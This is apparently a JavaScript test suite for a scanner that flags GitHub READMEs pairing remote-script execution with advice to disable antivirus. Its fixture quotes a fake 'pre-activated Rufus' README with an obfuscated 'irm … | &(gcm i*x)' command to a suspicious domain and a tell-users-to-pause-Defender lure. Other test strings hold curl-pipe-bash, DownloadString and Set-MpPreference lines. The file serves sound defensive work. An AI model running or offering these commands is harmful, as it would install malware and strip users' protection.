import { test } from 'node:test';
import assert from 'node:assert/strict';
import { classifyReadme, createReadmeScanner, fetchReadme, RULE_VERSION } from '../src/services/readme-scan.js';

// 2026-11-09 공개 피드에서 확인한 군집 README의 핵심 구간(research/readmes/TrackerMonarch_rufus.md).
const CLUSTER_README = `# Rufus
**This repository provides a pre-activated, free setup for Rufus.**
1. Open Terminal as Administrator:
   \`\`\`cmd
   irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
   \`\`\`
### 🛡️ Antivirus / SmartScreen Warnings
Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.`;

test('원격 스크립트 실행 지시와 실시간 보호 중지 안내가 함께 있으면 malicious이고 두 줄을 근거로 남긴다', () => {
  const result = classifyReadme(CLUSTER_README);
  assert.equal(result.verdict, 'malicious');
  assert.match(result.evidence, /irm https:\/\/windows-defender\.cc\/updater\/Fix\.ps1/);
  assert.match(result.evidence, /pause "Real-time protection"/);
  assert.ok(result.evidence.length <= 500);
});

test('Invoke-Expression·DownloadString 변형과 Defender 끄기 안내 조합도 malicious다', () => {
  const text = [
    'Run: iex (New-Object Net.WebClient).DownloadString("https://x.example/a.ps1")',
    'Before installing, turn off Windows Defender.',
  ].join('\n');
  assert.equal(classifyReadme(text).verdict, 'malicious');
  assert.equal(classifyReadme('Set-MpPreference -DisableRealtimeMonitoring $true\ncurl -fsSL https://x.example/i.sh | bash').verdict, 'malicious');
});

test('정상 원격 설치 명령만 있으면 clean이다', () => {
  for (const text of [
    'irm https://get.scoop.sh | iex',
    'powershell -c "irm https://astral.sh/uv/install.ps1 | iex"',
    'curl -fsSL https://bun.sh/install | bash',
    '- [herdr](https://herdr.dev) (`curl -fsSL https://herdr.dev/install.sh | sh`)',
  ]) {
    assert.equal(classifyReadme(text).verdict, 'clean', text);
  }
});

test('백신 끄기 안내만 있거나 예외 등록·SmartScreen 안내와 원격 실행이 함께 있어도 clean이다', () => {
  assert.equal(classifyReadme('If blocked, pause Real-time protection and run setup.exe').verdict, 'clean');
  assert.equal(classifyReadme([
    'irm https://example.dev/install.ps1 | iex',
    'Restore the files from Windows Security\'s Protection history, or add `%LOCALAPPDATA%\\App` to its exclusions',
  ].join('\n')).verdict, 'clean');
  assert.equal(classifyReadme([
    'irm https://example.dev/install.ps1 | iex',
    'If SmartScreen appears, click "More info" → "Run anyway".',
  ].join('\n')).verdict, 'clean');
});

test('README가 없거나 비어 있으면 clean이다', () => {
  assert.deepEqual(classifyReadme(null), { verdict: 'clean', evidence: null });
  assert.deepEqual(classifyReadme(''), { verdict: 'clean', evidence: null });
});

test('fetchReadme는 getReadme raw만 호출하고 404는 null, 그 밖의 오류는 던진다', async () => {
  const calls = [];
  const octokit = (impl) => ({ rest: { repos: { getReadme: async (options) => { calls.push(options); return impl(); } } } });
  assert.equal(await fetchReadme(octokit(() => ({ data: '# hi' })), 'o', 'r'), '# hi');
  assert.deepEqual(calls[0], { owner: 'o', repo: 'r', mediaType: { format: 'raw' } });
  assert.equal(await fetchReadme(octokit(() => { throw Object.assign(new Error('nf'), { status: 404 }); }), 'o', 'r'), null);
  await assert.rejects(fetchReadme(octokit(() => { throw Object.assign(new Error('boom'), { status: 502 }); }), 'o', 'r'), /boom/);
});

const PUSHED = '2026-11-08T08:40:39Z';
const SCANNED = new Date('2026-11-09T06:00:00Z');

function scanner({ existing = [], readmes = {} } = {}) {
  const saved = [];
  const fetched = [];
  const warnings = [];
  const model = {
    findVerdicts: async (ids) => new Map(existing.filter((row) => ids.includes(row.github_id)).map((row) => [row.github_id, row])),
    upsertVerdict: async (row) => { saved.push(row); },
  };
  const instance = createReadmeScanner({
    model,
    fetchReadme: async (octokit, owner, name) => {
      fetched.push(`${owner}/${name}`);
      const value = readmes[`${owner}/${name}`];
      if (value instanceof Error) throw value;
      return value ?? null;
    },
    log: { warn: (message) => warnings.push(message) },
    now: () => SCANNED,
  });
  return { instance, saved, fetched, warnings };
}

test('판정이 없는 저장소를 검사해 판정·규칙 버전·push 시각·검사 시각을 저장하고 중복 github_id는 한 번만 검사한다', async () => {
  const { instance, saved, fetched } = scanner({ readmes: { 'bad/rufus': CLUSTER_README, 'ok/tool': '# tool' } });
  const result = await instance.scanRepos({}, [
    { github_id: 1, owner: 'bad', name: 'rufus', pushed_at: PUSHED },
    { github_id: 1, owner: 'bad', name: 'rufus', pushed_at: PUSHED },
    { github_id: 2, owner: 'ok', name: 'tool', pushed_at: PUSHED },
  ]);
  assert.deepEqual(result, { scanned: 2, malicious: 1, unknown: 0, skipped: 0 });
  assert.deepEqual(fetched.sort(), ['bad/rufus', 'ok/tool']);
  const bad = saved.find((row) => row.github_id === 1);
  assert.equal(bad.verdict, 'malicious');
  assert.equal(bad.rule_version, RULE_VERSION);
  assert.equal(bad.repo_pushed_at.toISOString(), '2026-11-08T08:40:39.000Z');
  assert.equal(bad.scanned_at.toISOString(), SCANNED.toISOString());
  assert.equal(saved.find((row) => row.github_id === 2).verdict, 'clean');
});

test('같은 규칙·같은 push 시각이면 건너뛰고, unknown·규칙 버전 변경·push 변경이면 다시 검사한다', async () => {
  const same = { verdict: 'malicious', rule_version: RULE_VERSION, repo_pushed_at: new Date(PUSHED) };
  const { instance, fetched, saved } = scanner({
    existing: [
      { github_id: 1, ...same },
      { github_id: 2, ...same, verdict: 'unknown', repo_pushed_at: null },
      { github_id: 3, ...same, rule_version: RULE_VERSION - 1 },
      { github_id: 4, ...same },
    ],
    readmes: { 'o/b': '# fine', 'o/c': '# fine', 'o/d': '# cleaned up' },
  });
  const result = await instance.scanRepos({}, [
    { github_id: 1, owner: 'o', name: 'a', pushed_at: PUSHED },
    { github_id: 2, owner: 'o', name: 'b', pushed_at: PUSHED },
    { github_id: 3, owner: 'o', name: 'c', pushed_at: PUSHED },
    { github_id: 4, owner: 'o', name: 'd', pushed_at: '2026-11-09T01:00:00Z' },
  ]);
  assert.deepEqual(result, { scanned: 3, malicious: 0, unknown: 0, skipped: 1 });
  assert.deepEqual(fetched.sort(), ['o/b', 'o/c', 'o/d']);
  // 내용이 바뀐 malicious 저장소가 재검사에서 clean이면 판정이 해제된다(R1.4).
  assert.equal(saved.find((row) => row.github_id === 4).verdict, 'clean');
});

test('조회 실패: 판정이 없던 저장소는 unknown으로 저장하고, 기존 판정은 유지하며, 로그에 오류 원문을 남기지 않는다', async () => {
  const failure = Object.assign(new Error('Bad credentials token=ghp_secret'), { status: 503 });
  const { instance, saved, warnings } = scanner({
    existing: [{ github_id: 9, verdict: 'malicious', rule_version: RULE_VERSION, repo_pushed_at: new Date(PUSHED) }],
    readmes: { 'o/new': failure, 'o/known': failure },
  });
  const result = await instance.scanRepos({}, [
    { github_id: 8, owner: 'o', name: 'new', pushed_at: PUSHED },
    { github_id: 9, owner: 'o', name: 'known', pushed_at: '2026-11-09T02:00:00Z' },
  ]);
  assert.deepEqual(result, { scanned: 0, malicious: 0, unknown: 1, skipped: 0 });
  assert.deepEqual(saved, [{
    github_id: 8, verdict: 'unknown', rule_version: RULE_VERSION, evidence: null, repo_pushed_at: null, scanned_at: SCANNED,
  }]);
  assert.equal(warnings.length, 2);
  for (const message of warnings) {
    assert.match(message, /status=503/);
    assert.doesNotMatch(message, /ghp_secret|Bad credentials/);
  }
});

test('보호 기능 자체 해제가 아닌 안내(부정문·알림 끄기·예외 등록)는 원격 설치와 함께 있어도 clean이다', () => {
  const install = 'irm https://get.scoop.sh | iex';
  for (const guidance of [
    'Never disable Windows Defender.',
    'Turn off notifications in Windows Security.',
    'Disable scanning of this folder by adding it to Windows Defender exclusions.',
    'Disable Windows Defender for this folder by adding an exclusion.',
  ]) {
    assert.equal(classifyReadme(`${install}\n${guidance}`).verdict, 'clean', guidance);
  }
});

test('파이프 이어쓰기와 문단 안 줄바꿈으로 나눠도 두 신호를 찾고, 표 셀이나 로컬 파일 실행은 원격 실행으로 보지 않는다', () => {
  assert.equal(classifyReadme('irm https://example.invalid/install.ps1 |\n  iex\nDisable Windows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('irm https://example.invalid/install.ps1 | iex\nBefore setup, disable\nWindows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('| curl https://example.invalid/a | sh helper |\nDisable Windows Defender.').verdict, 'clean');
  assert.equal(classifyReadme('curl ./install.sh | bash\nDisable Windows Defender.').verdict, 'clean');
  assert.equal(classifyReadme('Command | Shell\n--- | ---\ncurl https://example.invalid/a | sh helper\n\nDisable Windows Defender.').verdict, 'clean');
  assert.equal(classifyReadme('```powershell\nirm https://example.invalid/install.ps1 `\n  | iex |\n  Out-Null\n```\nDisable Windows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('curl https://example.invalid/install.sh | ba\\\nsh\nDisable Windows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('---\nirm https://example.invalid/install.ps1 | iex\nDisable Windows Defender.').verdict, 'malicious');
});

test('강조된 부정문·부속 대상 끄기·파일명 속 마침표·목록 항목 경계를 구분한다', () => {
  const install = 'irm https://get.scoop.sh | iex';
  assert.equal(classifyReadme(`${install}\n**Never** disable Windows Defender.`).verdict, 'clean');
  assert.equal(classifyReadme(`${install}\nDisable Windows Defender notifications.`).verdict, 'clean');
  assert.equal(classifyReadme(`${install}\nDisable Windows Defender for setup.exe by adding an exclusion.`).verdict, 'clean');
  assert.equal(classifyReadme(`${install}\n- Add a firewall exception\n- Disable Windows Defender`).verdict, 'malicious');
  assert.equal(classifyReadme(`${install}\nDisable Windows Defender; warnings may still appear until you reboot.`).verdict, 'malicious');
});

test('빈 줄 없이 표 뒤에 이어진 제목·목록의 명령도 검사하고, 짧은 문장이 아주 많아도 실패하지 않는다', () => {
  assert.equal(classifyReadme(
    '| Platform | Supported |\n| --- | --- |\n| Windows | Yes |\n## Installation\n1. Run irm https://example.invalid/install.ps1 | iex\n2. Disable Windows Defender.',
  ).verdict, 'malicious');
  const many = `irm https://example.invalid/install.ps1 | iex\n${'OK. '.repeat(128_000)}Disable Windows Defender.`;
  assert.ok(Buffer.byteLength(many) < 512 * 1024);
  assert.equal(classifyReadme(many).verdict, 'malicious');
});

test('512KB 상한 크기의 반복 토큰 입력도 선형 시간에 판정한다', () => {
  for (const text of [
    'curl '.repeat(100_000),
    `${'irm '.repeat(50_000)}| ${'x'.repeat(200_000)}`,
    `disable ${'windows '.repeat(60_000)}`,
    `${'a-'.repeat(250_000)}`,
    `iex${' '.repeat(500_000)}`,
    `irm https://example.invalid/install.ps1 | iex\n${'Defender off '.repeat(40_000)}exclusion`,
    `irm https://example.invalid/install.ps1 | iex\n${'| --- '.repeat(80_000)}`,
  ]) {
    const started = performance.now();
    classifyReadme(text);
    assert.ok(performance.now() - started < 1000, `${text.slice(0, 12)}… took too long`);
  }
});

test('저장 실패는 그 저장소에만 머물고 나머지 판정이 모두 끝난 뒤 반환한다', async () => {
  const saved = [];
  const warnings = [];
  let releaseSlow;
  const slow = new Promise((resolve) => { releaseSlow = resolve; });
  const instance = createReadmeScanner({
    model: {
      findVerdicts: async () => new Map(),
      upsertVerdict: async (row) => {
        if (row.github_id === 1) throw Object.assign(new Error('deadlock'), { code: 'ER_LOCK_DEADLOCK' });
        saved.push(row);
      },
    },
    fetchReadme: async (octokit, owner, name) => {
      if (name === 'slow') { setTimeout(releaseSlow, 20); await slow; }
      return CLUSTER_README;
    },
    log: { warn: (message) => warnings.push(message) },
    now: () => SCANNED,
  });
  await instance.scanRepos({}, [
    { github_id: 1, owner: 'o', name: 'first', pushed_at: PUSHED },
    { github_id: 2, owner: 'o', name: 'slow', pushed_at: PUSHED },
  ]);
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[2, 'malicious']]);
  assert.deepEqual(warnings, ['[readme-scan] github_id=1 store=ER_LOCK_DEADLOCK']);
});

test('README 요청 시작은 동시 실행이어도 minIntervalMs 이상 떨어진다', async () => {
  const starts = [];
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async () => {} },
    fetchReadme: async () => { starts.push(performance.now()); return '# ok'; },
    log: { warn() {} },
    concurrency: 4,
    minIntervalMs: 30,
  });
  await instance.scanRepos({}, [1, 2, 3, 4, 5].map((id) => ({ github_id: id, owner: 'o', name: `r${id}`, pushed_at: PUSHED })));
  assert.equal(starts.length, 5);
  const sorted = [...starts].sort((a, b) => a - b);
  // 타이머가 1ms 일찍 깨어날 수 있어 2ms 여유를 둔다.
  sorted.slice(1).forEach((start, index) => assert.ok(start - sorted[index] >= 28, `${sorted}`));
});

test('2차 한도(403 rate limit·429)에 걸리면 그 저장소는 R2.2대로 unknown, 아직 요청하지 않은 저장소는 판정 없이 다음 수집으로 넘긴다', async () => {
  const saved = [];
  const warnings = [];
  let calls = 0;
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async (row) => { saved.push(row); } },
    fetchReadme: async () => {
      calls++;
      if (calls === 2) throw Object.assign(new Error('You have exceeded a secondary rate limit'), { status: 403, response: { headers: {} } });
      return '# ok';
    },
    log: { warn: (message) => warnings.push(message) },
    concurrency: 1,
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [1, 2, 3, 4].map((id) => ({ github_id: id, owner: 'o', name: `r${id}`, pushed_at: PUSHED })));
  assert.equal(calls, 2);
  assert.deepEqual(result, { scanned: 1, malicious: 0, unknown: 1, skipped: 2 });
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[1, 'clean'], [2, 'unknown']]);
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /rate limited status=403/);
});

test('rate limit이 아닌 403(접근 차단 저장소)은 그 저장소만 unknown으로 남기고 계속한다', async () => {
  const saved = [];
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async (row) => { saved.push(row); } },
    fetchReadme: async (octokit, owner, name) => {
      if (name === 'r1') throw Object.assign(new Error('Repository access blocked'), { status: 403, response: { headers: { 'x-ratelimit-remaining': '4000' } } });
      return '# ok';
    },
    log: { warn() {} },
    concurrency: 1,
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [1, 2].map((id) => ({ github_id: id, owner: 'o', name: `r${id}`, pushed_at: PUSHED })));
  assert.deepEqual(result, { scanned: 1, malicious: 0, unknown: 1, skipped: 0 });
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[1, 'unknown'], [2, 'clean']]);
});
